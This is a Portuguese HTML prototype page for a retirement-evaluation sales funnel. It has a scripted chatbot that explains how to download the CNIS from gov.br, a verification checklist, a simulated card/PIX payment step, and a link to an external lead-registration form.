<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Avaliação de Aposentadoria - Teste</title>
    <link rel="stylesheet" href="styles.css">
    <script src="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/js/all.min.js"></script>
    <script type="importmap">
    {
      "imports": {
        "navigation": "./navigation.js"
      }
    }
    </script>
    <script src="window-manager.js"></script>
    <style>
    /* CSS Styles */
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    body {
        font-family: Arial, sans-serif;
        background-color: #f5f5f5;
        color: #333;
        line-height: 1.6;
    }

    .container {
        max-width: 1000px;
        margin: 0 auto;
        padding: 20px;
        position: relative;
    }

    .logo {
        position: absolute;
        top: 20px;
        left: 20px;
        width: 180px;
        height: auto;
        z-index: 10;
    }

    .step {
        display: none;
        background-color: white;
        border-radius: 10px;
        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        padding: 30px;
        margin-bottom: 20px;
        transition: all 0.3s ease;
    }

    .step.active {
        display: block;
        animation: fadeIn 0.5s ease;
    }

    @keyframes fadeIn {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
    }

    .header {
        text-align: center;
        margin-bottom: 30px;
        border-bottom: 2px solid #f0f0f0;
        padding-bottom: 15px;
    }

    .header h1 {
        color: #1a73e8;
        font-size: 28px;
        margin-bottom: 10px;
    }

    .header h2 {
        color: #444;
        font-size: 22px;
        font-weight: 500;
    }

    .header p {
        color: #666;
        font-size: 16px;
    }

    /* Step 1 - Offer Card */
    .offer-card {
        background: linear-gradient(135deg, #f8f9fa, #e9ecef);
        border-radius: 8px;
        padding: 25px;
        border-left: 5px solid #1a73e8;
    }

    .offer-card h3 {
        color: #1a73e8;
        margin-bottom: 15px;
        font-size: 20px;
    }

    .offer-details {
        margin: 20px 0;
    }

    .offer-details p {
        margin-bottom: 15px;
    }

    .offer-details h4 {
        color: #e63946;
        margin: 15px 0 10px;
    }

    .offer-details ul {
        list-style: none;
        margin-left: 10px;
    }

    .offer-details li {
        margin-bottom: 10px;
        font-size: 16px;
    }

    .cta-button {
        display: inline-block !important;
        width: auto !important;
        padding: 12px 24px !important;
        background-color: #1a73e8 !important;
        color: #fff !important;
        border: none !important;
        border-radius: 25px !important;
        font-size: 16px !important;
        font-weight: bold !important;
        cursor: pointer !important;
        transition: background-color 0.3s ease, transform 0.3s ease !important;
        text-align: center !important;
    }

    .cta-button:hover {
        background-color: #0d62d0;
        transform: translateY(-2px);
    }

    /* Step 2 - Chat and Video */
    .content-wrapper {
        display: flex;
        flex-wrap: wrap;
        gap: 20px;
        margin-bottom: 30px;
    }

    .video-container, .chat-container {
        flex: 1;
        min-width: 300px;
    }

    .video-placeholder {
        background-color: #f0f0f0;
        border-radius: 8px;
        height: 300px;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        color: #666;
    }

    .video-placeholder i {
        font-size: 50px;
        color: #e63946;
        margin-bottom: 15px;
    }

    .chat-container {
        border: 1px solid #ddd;
        border-radius: 8px;
        overflow: hidden;
        display: flex;
        flex-direction: column;
        height: 400px;
    }

    .chat-header {
        background-color: #1a73e8;
        color: white;
        padding: 10px 15px;
    }

    .chat-messages {
        flex: 1;
        padding: 15px;
        overflow-y: auto;
        background-color: #f8f9fa;
    }

    .message {
        margin-bottom: 15px;
        padding: 10px 15px;
        border-radius: 18px;
        max-width: 80%;
        word-break: break-word;
    }

    .message.bot {
        background-color: #e9f5ff;
        color: #333;
        border-bottom-left-radius: 5px;
        align-self: flex-start;
    }

    .message.user {
        background-color: #1a73e8;
        color: white;
        border-bottom-right-radius: 5px;
        margin-left: auto;
    }

    .chat-input {
        display: flex;
        border-top: 1px solid #ddd;
        padding: 10px;
        background-color: white;
    }

    .chat-input input {
        flex: 1;
        padding: 10px;
        border: 1px solid #ddd;
        border-radius: 20px;
        outline: none;
    }

    .chat-input button {
        background-color: #1a73e8;
        color: white;
        border: none;
        width: 40px;
        height: 40px;
        border-radius: 50%;
        margin-left: 10px;
        cursor: pointer;
    }

    /* Step 3 - Verification */
    .verification-container {
        display: flex;
        flex-wrap: wrap;
        gap: 30px;
        margin-bottom: 30px;
    }

    .orientation-tip {
        display: flex;
        justify-content: center;
        align-items: center;
        background-color: #ffffff;
        border: 1px solid #ffffff;
        border-radius: 8px;
        padding: 15px;
        margin-bottom: 30px;
    }

    .orientation-tip i {
        /* Additional styles */
    }

    /* Additional CSS rules omitted for brevity */

    .back-button {
        display: inline-block;
        padding: 10px 20px;
        background-color: #1a73e8;
        color: #fff;
        border: none;
        border-radius: 25px;
        font-size: 16px;
        font-weight: bold;
        cursor: pointer;
        transition: background-color 0.3s ease, transform 0.3s ease;
        text-align: center;
        margin-top: 20px;
        width: auto;
        position: absolute;
        top: 65px;
        left: 35px;
    }

    .back-button:hover {
        background-color: #0d62d0;
        transform: translateY(-2px);
    }

    .cta-button-container {
        display: flex !important;
        justify-content: flex-end !important;
        margin-top: 20px !important;
    }

    .payment-container {
        display: flex;
        flex-wrap: wrap;
        gap: 20px;
        margin-bottom: 30px;
        background-color: #f9f9f9;
        border-radius: 10px;
        padding: 20px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }

    .payment-options, .payment-summary {
        flex: 1;
        min-width: 300px;
    }

    .payment-options {
        padding-right: 20px;
        border-right: 1px solid #ddd;
    }

    .payment-summary {
        padding-left: 20px;
    }

    .payment-option {
        display: flex;
        align-items: center;
        margin-bottom: 15px;
    }

    .payment-option input {
        margin-right: 10px;
    }

    .payment-field {
        margin-bottom: 15px;
    }

    .payment-field label {
        display: block;
        margin-bottom: 5px;
        font-weight: bold;
    }

    .cta-button {
        width: 100%;
        padding: 15px;
        background-color: #1a73e8;
        color: #fff;
        border: none;
        border-radius: 25px;
        font-size: 18px;
        font-weight: bold;
        cursor: pointer;
        transition: background-color 0.3s ease, transform 0.3s ease;
        text-align: center;
    }

    .cta-button:hover {
        background-color: #0d62d0;
        transform: translateY(-2px);
    }

    .cadastro-container {
        background-color: #f9f9f9;
        border-radius: 10px;
        padding: 20px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        margin-bottom: 30px;
    }

    .cadastro-steps {
        display: flex;
        flex-direction: column;
        gap: 15px;
        margin-bottom: 20px;
    }

    .step-item {
        display: flex;
        align-items: center;
        padding: 10px;
        background-color: #ffffff;
        border-radius: 8px;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
    }

    .step-number {
        background-color: #1a73e8;
        color: #fff;
        width: 30px;
        height: 30px;
        display: flex;
        justify-content: center;
        align-items: center;
        border-radius: 50%;
        margin-right: 10px;
        font-weight: bold;
    }

    .step-text {
        font-size: 16px;
        color: #333;
    }

    .upload-preview {
        text-align: center;
        margin-top: 20px;
    }

    .upload-preview .button {
        padding: 12px 24px;
        background-color: #1a73e8;
        color: #fff;
        border: none;
        border-radius: 25px;
        font-size: 16px;
        font-weight: bold;
        cursor: pointer;
        transition: background-color 0.3s ease, transform 0.3s ease;
    }

    .upload-preview .button:hover {
        background-color: #0d62d0;
        transform: translateY(-2px);
    }

    .final-screen-container {
        background-color: #f9f9f9;
        border-radius: 10px;
        padding: 30px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        margin-bottom: 30px;
        text-align: center;
    }

    .final-screen-header {
        margin-bottom: 20px;
    }

    .final-screen-content {
        margin-bottom: 30px;
    }

    .final-screen-button {
        padding: 15px 30px;
        background-color: #1a73e8;
        color: #fff;
        border: none;
        border-radius: 25px;
        font-size: 18px;
        font-weight: bold;
        cursor: pointer;
        transition: background-color 0.3s ease, transform 0.3s ease;
    }

    .final-screen-button:hover {
        background-color: #0d62d0;
        transform: translateY(-2px);
    }

    .cta-button-container-center {
        display: flex;
        justify-content: center;
        margin-top: 20px;
    }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://app.calculojuridico.net.br/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBejRUSWc9PSIsImV4cCI6bnVsbCwicHVyIjoiYmxvYl9pZCJ9fQ==--848291bea6f8553992f12fb8870ff64116eeb57d/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCem9MWm05eWJXRjBTU0lJYW5CbkJqb0dSVlE2RW5KbGMybDZaVjkwYjE5bWFYUmJCMmtDa0FGcE53PT0iLCJleHAiOm51bGwsInB1ciI6InZhcmlhdGlvbiJ9fQ==--e6a3a2aa23af25066fc7b42a75dbef9132310a99/logo%20L&L.jpg" alt="Logo L&L" class="logo">
        
        <div id="step1" class="step active">
            <div class="header">
                <h1> APOSENTADORIA TAMBÉM É PARA VOCÊ!</h1>
                <h2>A questão é com quanto e em quanto tempo!</h2>
            </div>
            
            <div class="offer-card">
                <h3> Avaliação da Situação Previdenciária</h3>
                <p>Não deixe para depois o que pode impactar seu futuro!</p>
                
                <div class="offer-details">
                    <p> Tenha clareza sobre sua aposentadoria enquanto há tempo para planejar.</p>
                    
                    <h4> Oferta Exclusiva:</h4>
                    <ul>
                        <li> Faça sua consulta conosco e identifique oportunidades</li>
                        <li> Evite riscos e perdas financeiras</li>
                        <li> Prepare-se para uma aposentadoria tranquila</li>
                    </ul>
                </div>
                
                <div class="cta-button-container-center">
                    <button id="btnNextStep" class="cta-button">
                        Acesse Agora!
                    </button>
                </div>
            </div>
        </div>
        
        <div id="step2" class="step">
            <div class="header">
                <h2>Interação com Assistente Virtual</h2>
                <p>Siga as instruções abaixo para obter seu CNIS</p>
            </div>
            
            <button class="back-button" data-target="step1">
                <i class="fas fa-arrow-left"></i> Voltar
            </button>
            
            <div class="content-wrapper">
                <div class="video-container">
                    <div class="video-placeholder">
                        <iframe src="https://drive.google.com/file/d/1j0E4sGVQEVwk03eV1kdnFzxylCxMMcvk/preview" width="100%" height="300" allow="autoplay"></iframe>
                        <p>Vídeo explicativo: Como baixar seu CNIS</p>
                    </div>
                </div>
                
                <div class="chat-container">
                    <div class="chat-header">
                        <h3>Assistente Virtual</h3>
                    </div>
                    <div class="chat-messages" id="chatMessages">
                        <div class="message bot">
                            Olá! Vou te ajudar a baixar o seu CNIS corretamente. Siga as instruções:
                        </div>
                        <div class="message bot">
                            1. Acesse o site <a href="https://www.gov.br" target="_blank">www.gov.br</a>
                        </div>
                        <div class="message bot">
                            2. Clique em "Entrar" e faça login com seu CPF e senha
                        </div>
                        <div class="message bot">
                            3. Procure a opção "Emitir Extrato de Contribuições"
                        </div>
                        <div class="message bot">
                            4. Clique no botão "Iniciar" e autorize o acesso ao Meu INSS
                        </div>
                        <div class="message bot">
                            5. Vá para a aba "Extrato de Contribuições"
                        </div>
                        <div class="message bot">
                            6. Role até o final e clique em "Baixar Documento"
                        </div>
                        <div class="message bot">
                            7. Selecione "Vínculos, Contribuições e Remunerações"
                        </div>
                        <div class="message bot">
                            8. Aguarde a geração e faça o download do PDF
                        </div>
                    </div>
                    <div class="chat-input">
                        <input type="text" id="userMessage" placeholder="Digite sua dúvida aqui...">
                        <button id="sendMessage"><i class="fas fa-paper-plane"></i></button>
                    </div>
                </div>
            </div>
            
            <div class="cta-button-container-center">
                <button id="btnToStep3" class="cta-button">
                    Já baixei meu CNIS, próximo passo
                </button>
            </div>
        </div>
        
        <div id="step3" class="step">
            <div class="header">
                <h2>Verificação do CNIS</h2>
                <p>Vamos verificar se seu documento está correto</p>
            </div>
            
            <button class="back-button" data-target="step2">
                <i class="fas fa-arrow-left"></i> Voltar
            </button>
            
            <div class="orientation-tip">
                <img src="https://d1yei2z3i6k35z.cloudfront.net/3119789/67f02655b441a_aviso_psicao_pdf.png" alt="Aviso de Orientação do Documento" style="width: 80%; height: auto;">
            </div>
            
            <div class="verification-container">
                <div class="verification-checklist">
                    <h3>O seu CNIS possui:</h3>
                    <div class="checklist-item">
                        <input type="checkbox" id="check1">
                        <label for="check1">Seus dados pessoais completos</label>
                    </div>
                    <div class="checklist-item">
                        <input type="checkbox" id="check2">
                        <label for="check2">Histórico completo de contribuições e remunerações</label>
                    </div>
                    <div class="checklist-item">
                        <input type="checkbox" id="check3">
                        <label for="check3">Vínculos empregatícios</label>
                    </div>
                    <div class="checklist-item">
                        <input type="checkbox" id="check4">
                        <label for="check4">Períodos de contribuição individual (se houver)</label>
                    </div>
                </div>
                
                <div class="cnis-preview">
                    <div class="cnis-icon">
                       <!--  <i class="fas fa-file-pdf"></i>
                       <p>Seu CNIS</p> -->
                    </div>
                </div>
            </div>
            
            <div class="cta-button-container-center">
                <button id="btnToStep4" class="cta-button">
                    Documento verificado, próximo passo
                </button>
            </div>
        </div>
        
        <div id="stepPayment" class="step">
            <div class="header">
                <h2>Confirmação de Pagamento</h2>
                <p>Complete o pagamento para acessar o Sistema de Análise</p>
            </div>
            
            <button class="back-button" data-target="step3">
                <i class="fas fa-arrow-left"></i> Voltar
            </button>
            
            <div class="payment-container">
                <div class="payment-options">
                    <h3>Selecione a forma de pagamento:</h3>
                    
                    <div class="payment-option">
                        <input type="radio" id="paymentCredit" name="paymentMethod" checked>
                        <label for="paymentCredit">Cartão de Crédito</label>
                    </div>
                    
                    <div class="payment-option">
                        <input type="radio" id="paymentPix" name="paymentMethod">
                        <label for="paymentPix">PIX</label>
                    </div>
                    
                    <div class="payment-option">
                        <input type="radio" id="paymentBoleto" name="paymentMethod">
                        <label for="paymentBoleto">Boleto Bancário</label>
                    </div>
                    
                    <div class="payment-details">
                        <div class="payment-field">
                            <label>Valor do serviço:</label>
                            <span class="price payment-price">R$ 197,00</span>
                            <span class="installment-info" id="installmentInfo"></span>
                        </div>
                        
                        <hr>
                        
                        <div class="pix-container" id="pixContainer" style="display: none;">
                            <div class="qr-code">
                                <svg width="200" height="200" viewBox="0 0 200 200" id="pixQrCode">
                                    <rect width="200" height="200" fill="#ffffff"/>
                                    <!-- QR Code pattern -->
                                    <g fill="#000000">
                                        <!-- QR Code squares pattern -->
                                        <!-- Frame corners -->
                                        <rect x="20" y="20" width="30" height="30"/>
                                        <rect x="150" y="20" width="30" height="30"/>
                                        <rect x="20" y="150" width="30" height="30"/>
                                        <!-- Inner pattern -->
                                        <rect x="60" y="60" width="10" height="10"/>
                                        <rect x="80" y="60" width="10" height="10"/>
                                        <rect x="100" y="60" width="10" height="10"/>
                                        <!-- More pattern elements -->
                                        <rect x="60" y="80" width="10" height="10"/>
                                        <rect x="90" y="80" width="10" height="10"/>
                                        <rect x="120" y="80" width="10" height="10"/>
                                        <rect x="60" y="100" width="10" height="10"/>
                                        <rect x="80" y="100" width="10" height="10"/>
                                        <rect x="110" y="100" width="10" height="10"/>
                                        <rect x="130" y="100" width="10" height="10"/>
                                        <!-- More squares to make it look like a QR code -->
                                        <rect x="70" y="110" width="10" height="10"/>
                                        <rect x="100" y="110" width="10" height="10"/>
                                        <rect x="120" y="110" width="10" height="10"/>
                                        <rect x="60" y="120" width="10" height="10"/>
                                        <rect x="90" y="120" width="10" height="10"/>
                                        <rect x="110" y="120" width="10" height="10"/>
                                        <rect x="70" y="130" width="10" height="10"/>
                                        <rect x="100" y="130" width="10" height="10"/>
                                    </g>
                                </svg>
                                <p>Escaneie o QR Code para pagar</p>
                            </div>
                            <div class="pix-info">
                                <p><strong>Valor:</strong> R$ 197,00</p>
                                <p><strong>Chave PIX:</strong> pix@llconsultoria.com.br</p>
                            </div>
                        </div>
                        
                        <div class="card-inputs" id="cardInputs">
                            <div class="payment-field">
                                <label for="cardNumber">Número do Cartão:</label>
                                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000">
                            </div>
                            
                            <div class="payment-field-group">
                                <div class="payment-field">
                                    <label for="cardExpiry">Validade:</label>
                                    <input type="text" id="cardExpiry" placeholder="MM/AA">
                                </div>
                                
                                <div class="payment-field">
                                    <label for="cardCVV">CVV:</label>
                                    <input type="text" id="cardCVV" placeholder="123">
                                </div>
                            </div>
                            
                            <div class="payment-field">
                                <label for="cardName">Nome no Cartão:</label>
                                <input type="text" id="cardName" placeholder="Como está no cartão">
                            </div>
                            
                            <div class="payment-field">
                                <label for="installments">Parcelamento:</label>
                                <select id="installments">
                                    <option value="1">1x de R$ 197,00</option>
                                    <option value="2">2x de R$ 98,50</option>
                                    <option value="3">3x de R$ 67,00</option>
                                </select>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="payment-summary">
                    <div class="summary-header">
                        <h3>Resumo do pedido</h3>
                    </div>
                    <div class="summary-content">
                        <div class="summary-item">
                            <span>Avaliação Previdenciária</span>
                            <span class="summary-price">R$ 197,00</span>
                        </div>
                        <hr>
                        <div class="summary-total">
                            <span>Total:</span>
                            <span class="summary-total-price">R$ 197,00</span>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="cta-button-container-center">
                <button id="btnCompletePayment" class="cta-button">
                    <i class="fas fa-lock"></i> Finalizar Pagamento
                </button>
            </div>
        </div>
        
        <div id="stepProcessing" class="step">
            <div class="header">
                <h2>Processando Pagamento</h2>
                <p>Por favor, aguarde enquanto processamos seu pagamento</p>
            </div>
            
            <div class="processing-container">
                <div class="spinner">
                    <svg viewBox="0 0 50 50" width="50" height="50">
                        <circle cx="25" cy="25" r="20" fill="none" stroke="#1a73e8" stroke-width="5" stroke-linecap="round" stroke-dasharray="31.4 31.4">
                            <animateTransform attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="1s" repeatCount="indefinite"/>
                        </circle>
                    </svg>
                </div>
                
                <div class="processing-message">
                    <h3>Aguarde um momento...</h3>
                    <p>Estamos confirmando seu pagamento com a instituição financeira</p>
                    <div class="progress-bar">
                        <div class="progress-fill"></div>
                    </div>
                </div>
            </div>
        </div>
        
        <div id="stepThankYou" class="step">
            <div class="header">
                <h2>Pagamento Concluído!</h2>
                <p>Obrigado por sua confiança</p>
            </div>
            
            <div class="thank-you-container">
                <div class="success-icon">
                    <svg viewBox="0 0 24 24" width="100" height="100">
                        <circle cx="12" cy="12" r="11" fill="#4CAF50" />
                        <path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z" fill="white"/>
                    </svg>
                </div>
                
                <div class="thank-you-message">
                    <h3>Pagamento aprovado com sucesso!</h3>
                    <p>Sua transação foi concluída e seu acesso ao serviço foi liberado.</p>
                    <p>Vamos prosseguir para a próxima etapa em instantes...</p>
                </div>
            </div>
        </div>
        
        <div id="step4" class="step">
            <div class="header">
                <h2>Acesso ao Sistema de Análise</h2>
                <p>Cadastre-se e faça upload do seu CNIS</p>
            </div>
            
            <button class="back-button" data-target="stepThankYou">
                <i class="fas fa-arrow-left"></i> Voltar
            </button>
            
            <div class="cadastro-container">
                <div class="cadastro-steps">
                    <div class="step-item">
                        <div class="step-number">1</div>
                        <div class="step-text">Acesse o Sistema <!-- <a href="https://app.calculojuridico.net.br/leads/new/fa2bdebd-b642-4c34-ba43-f0e368a1ab0f" target="_blank" class="highlight-link">Sistema de Análise</a> --></div>
                    </div>
                    <div class="step-item">
                        <div class="step-number">2</div>
                        <div class="step-text">Preencha seus dados pessoais</div>
                    </div>
                    <div class="step-item">
                        <div class="step-number">3</div>
                        <div class="step-text">Faça upload do seu CNIS</div>
                    </div>
                    <div class="step-item">
                        <div class="step-number">4</div>
                        <div class="step-text">Confirme seu cadastro</div>
                    </div>
                </div>
                
                <div class="upload-preview">
                    <button class="button" onclick="abrirOuFocarJanela('https://app.calculojuridico.net.br/leads/new/fa2bdebd-b642-4c34-ba43-f0e368a1ab0f/', 'SistemadeAnalise', 400, 600, 2444, 1100, this)">
                        Acessar Sistema
                    </button>
                </div>
            </div>
            
            <div class="cta-button-container">
                <button id="btnToStep5" class="cta-button">
                    Upload realizado, finalizar
                </button>
            </div>
        </div>
        
        <div id="step5" class="step">
            <div class="header">
                <h2>Processo Concluído!</h2>
                <p>Obrigado por confiar em nossos serviços</p>
            </div>
            
            <button class="back-button" data-target="step4">
                <i class="fas fa-arrow-left"></i> Voltar
            </button>
            
            <div class="conclusion-container">
                <div class="success-icon">
                    <svg viewBox="0 0 24 24" width="100" height="100">
                        <circle cx="12" cy="12" r="11" fill="#4CAF50" />
                        <path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z" fill="white"/>
                    </svg>
                </div>
                
                <div class="conclusion-message">
                    <h3>Sua análise de aposentadoria foi iniciada!</h3>
                    <p>Em breve, um especialista entrará em contato com você para discutir os resultados e oportunidades identificadas.</p>
                </div>
                
                <div class="support-info">
                    <h4>Precisa de suporte?</h4>
                    <p>Entre em contato pelo WhatsApp: <a href="tel:+5511999999999">(11) 99999-9999</a></p>
                    <p>Ou envie um e-mail: <a href="mailto:suporte@aposentadoria.com.br">suporte@aposentadoria.com.br</a></p>
                </div>
                <br><br><button id="btnNewAnalysis" class="cta-button new-analysis-button">
                    <i class="fas fa-redo-alt"></i> Nova Análise
                </button>
            </div>
        </div>
        
        <div class="footer">
            <p>&copy; FNW Assessoria Digital, 2025. Todos os direitos reservados.</p>
        </div>
    </div>
    
    <script type="module" src="script.js"></script>
    <script src="cnis-verification.js"></script>
    <script>
    // JavaScript Code
    // Navigation between steps
    function navigateToStep(stepId) {
        // Hide all steps
        const steps = document.querySelectorAll('.step');
        steps.forEach(step => {
            step.classList.remove('active');
        });

        // Show the target step
        const targetStep = document.getElementById(stepId);
        if (targetStep) {
            targetStep.classList.add('active');
        }
    }

    document.addEventListener('DOMContentLoaded', function() {
        // Step navigation buttons
        const btnNextStep = document.getElementById('btnNextStep');
        const btnToStep3 = document.getElementById('btnToStep3');
        const btnToStep4 = document.getElementById('btnToStep4');
        const btnToStep5 = document.getElementById('btnToStep5');
        
        // Back buttons
        const backButtons = document.querySelectorAll('.back-button');
        
        // Chat functionality
        const userMessage = document.getElementById('userMessage');
        const sendMessage = document.getElementById('sendMessage');
        const chatMessages = document.getElementById('chatMessages');
        
        // Payment method selection
        const paymentCredit = document.getElementById('paymentCredit');
        const paymentPix = document.getElementById('paymentPix');
        const paymentBoleto = document.getElementById('paymentBoleto');
        const pixContainer = document.getElementById('pixContainer');
        const cardInputs = document.getElementById('cardInputs');
        const installments = document.getElementById('installments');
        const installmentInfo = document.getElementById('installmentInfo');
        
        // Navigate to step 2
        btnNextStep.addEventListener('click', function() {
            navigateToStep('step2');
        });
        
        // Navigate to step 3
        btnToStep3.addEventListener('click', function() {
            navigateToStep('step3');
        });
        
        // Navigate to payment step
        btnToStep4.addEventListener('click', function() {
            // Check if all checkboxes are checked
            const checkboxes = document.querySelectorAll('.verification-checklist input[type="checkbox"]');
            let allChecked = true;
            
            checkboxes.forEach(checkbox => {
                if (!checkbox.checked) {
                    allChecked = false;
                }
            });
            
            if (allChecked) {
                navigateToStep('stepPayment');
            } else {
                alert('Por favor, verifique todos os itens da lista para continuar.');
            }
        });
        
        // Navigate from payment to step 4
        const btnCompletePayment = document.getElementById('btnCompletePayment');
        btnCompletePayment.addEventListener('click', function() {
            navigateToStep('stepProcessing');
            
            // Simulate payment processing and show thank you page
            setTimeout(() => {
                navigateToStep('stepThankYou');
                
                // Proceed to next step after showing thank you page
                setTimeout(() => {
                    navigateToStep('step4');
                }, 3000);
            }, 3000);
        });
        
        // Navigate to step 5
        btnToStep5.addEventListener('click', function() {
            navigateToStep('step5');
        });
        
        // Add New Analysis button functionality
        const btnNewAnalysis = document.getElementById('btnNewAnalysis');
        if (btnNewAnalysis) {
            btnNewAnalysis.addEventListener('click', function() {
                navigateToStep('step1');
            });
        }
        
        // Back buttons functionality
        backButtons.forEach(button => {
            button.addEventListener('click', function() {
                const targetStep = this.getAttribute('data-target');
                navigateToStep(targetStep);
            });
        });
        
        // Handle chat messages
        sendMessage.addEventListener('click', function() {
            sendUserMessage();
        });
        
        userMessage.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendUserMessage();
            }
        });
        
        // Chat functions
        function sendUserMessage() {
            const message = userMessage.value.trim();
            if (message !== '') {
                // Add user message
                addMessage(message, 'user');
                
                // Clear input
                userMessage.value = '';
                
                // Simulate bot response
                setTimeout(() => {
                    respondToUser(message);
                }, 1000);
            }
        }
        
        function addMessage(text, sender) {
            const messageDiv = document.createElement('div');
            messageDiv.classList.add('message', sender);
            messageDiv.textContent = text;
            chatMessages.appendChild(messageDiv);
            
            // Scroll to bottom
            chatMessages.scrollTop = chatMessages.scrollHeight;
        }
        
        function respondToUser(message) {
            let response;
            
            // Simple keyword-based responses
            const lowerMessage = message.toLowerCase();
            
            if (lowerMessage.includes('login') || lowerMessage.includes('entrar')) {
                response = 'Para fazer login no Gov.br: Acesse www.gov.br, clique em "Entrar", insira seu CPF e senha, depois clique em "Login". Se aparecerem páginas de tutorial após o login, você pode fechá-las.';
            } 
            else if (lowerMessage.includes('cnis') || lowerMessage.includes('baixar') || lowerMessage.includes('extrato')) {
                response = 'Para baixar o CNIS: 1) Acesse www.gov.br 2) Faça login com CPF e senha 3) Procure "Emitir Extrato de Contribuições" 4) Clique em "Iniciar" 5) Autorize o acesso ao Meu INSS 6) Vá para "Extrato de Contribuições" 7) Role até o final e clique em "Baixar Documento" 8) Selecione "Vínculos, Contribuições e Remunerações" 9) Aguarde a geração do PDF';
            }
            else if (lowerMessage.includes('governo') || lowerMessage.includes('gov.br')) {
                response = 'A conta Gov.br é o meio de acesso digital aos serviços públicos. Acesse www.gov.br, clique em "Entrar" no site, insira seu CPF e senha, e então clique em "Login".';
            }
            else if (lowerMessage.includes('ajuda') || lowerMessage.includes('dúvida') || lowerMessage.includes('duvida')) {
                response = 'Estou aqui para ajudar! Você pode me perguntar sobre como acessar o Gov.br, baixar o CNIS ou qualquer outra dúvida relacionada ao processo de obtenção do seu extrato de contribuições.';
            }
            else {
                response = 'Compreendo sua mensagem. Para obter seu CNIS, acesse www.gov.br, faça login, procure "Emitir Extrato de Contribuições", clique em "Iniciar", autorize o acesso, navegue até "Extrato de Contribuições", role até o final, clique em "Baixar Documento" e selecione "Vínculos, Contribuições e Remunerações".';
            }
            
            addMessage(response, 'bot');
        }
        
        // Update price display based on payment method
        function updatePriceDisplay() {
            const summaryPrice = document.querySelector('.summary-price');
            const summaryTotalPrice = document.querySelector('.summary-total-price');
            const paymentPrice = document.querySelector('.payment-price');
            
            if (paymentPix.checked) {
                pixContainer.style.display = 'block';
                cardInputs.style.display = 'none';
                installmentInfo.textContent = '';
                
                // Set prices
                paymentPrice.textContent = 'R$ 197,00';
                summaryPrice.textContent = 'R$ 197,00';
                summaryTotalPrice.textContent = 'R$ 197,00';
            } else {
                pixContainer.style.display = 'none';
                cardInputs.style.display = 'block';
                
                // Set prices
                paymentPrice.textContent = 'R$ 197,00';
                summaryPrice.textContent = 'R$ 197,00';
                summaryTotalPrice.textContent = 'R$ 197,00';
            }
        }
        
        // Update installment info when changed
        installments.addEventListener('change', function() {
            const selectedOption = installments.options[installments.selectedIndex];
            installmentInfo.textContent = selectedOption.text;
        });
        
        // Payment method event listeners
        paymentCredit.addEventListener('change', updatePriceDisplay);
        paymentPix.addEventListener('change', updatePriceDisplay);
        paymentBoleto.addEventListener('change', updatePriceDisplay);
        
        // Initialize payment display
        updatePriceDisplay();

        // JavaScript to delay the appearance of the 'Voltar' button
        const backButton = document.querySelector('.back-button');
        setTimeout(() => {
            backButton.style.display = 'inline-block';
        }, 5000); // 5 seconds delay

        // Delay the appearance of the 'Upload realizado, finalizar' button
        const uploadButton = document.getElementById('btnToStep5');
        uploadButton.style.display = 'none'; // Esconde inicialmente
        setTimeout(() => {
            uploadButton.style.display = 'inline-block'; // Mostra após 5 segundos
        }, 5000); // Atraso de 5 segundos
    });

    // Define the abrirOuFocarJanela function
    function abrirOuFocarJanela(url, windowName, width, height, left, top, button) {
        // Open a new window with the specified parameters
        const newWindow = window.open(url, windowName, `width=${width},height=${height},left=${left},top=${top}`);
        if (newWindow) {
            newWindow.focus();
        } else {
            alert('Não foi possível abrir a janela. Verifique se o bloqueador de pop-ups está desativado.');
        }
    }
    </script>
</body>
</html> 
